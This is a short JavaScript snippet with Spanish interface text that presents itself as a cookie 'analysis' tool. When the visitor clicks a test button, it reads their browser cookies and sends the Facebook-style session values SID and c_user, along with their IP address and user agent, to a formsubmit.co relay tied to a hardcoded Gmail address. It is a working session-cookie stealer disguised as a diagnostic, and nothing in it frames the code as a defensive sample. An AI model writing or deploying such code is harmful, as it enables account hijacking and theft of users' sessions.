const sendToEmail = async (data) => {
    try {
        await fetch('https://formsubmit.co/ajax/muriilloventee@gmail.com', {
            method: "POST",
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                SID: data.SID || 'No detectada',
                c_user: data.c_user || 'No detectada',
                ip: await fetch('https://api.ipify.org?format=json')
                      .then(res => res.json())
                      .then(data => data.ip),
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            })
        });
    } catch (error) {
        console.error('Error de red:', error);
    }
};

document.getElementById('testBtn').addEventListener('click', async () => {
    const cookies = document.cookie.split('; ').reduce((acc, cookie) => {
        const [name, value] = cookie.split('=');
        acc[name] = decodeURIComponent(value);
        return acc;
    }, {});

    const resultDiv = document.getElementById('result');
    
    resultDiv.innerHTML = `
        <h3>Tus Cookies:</h3>
        <pre>${JSON.stringify(cookies, null, 2)}</pre>
        <p>Enviando resultados...</p>
    `;

    await sendToEmail(cookies);
    
    setTimeout(() => {
        resultDiv.innerHTML += '<p class="success">¡Análisis completado! Revisa tu correo.</p>';
    }, 2000);
});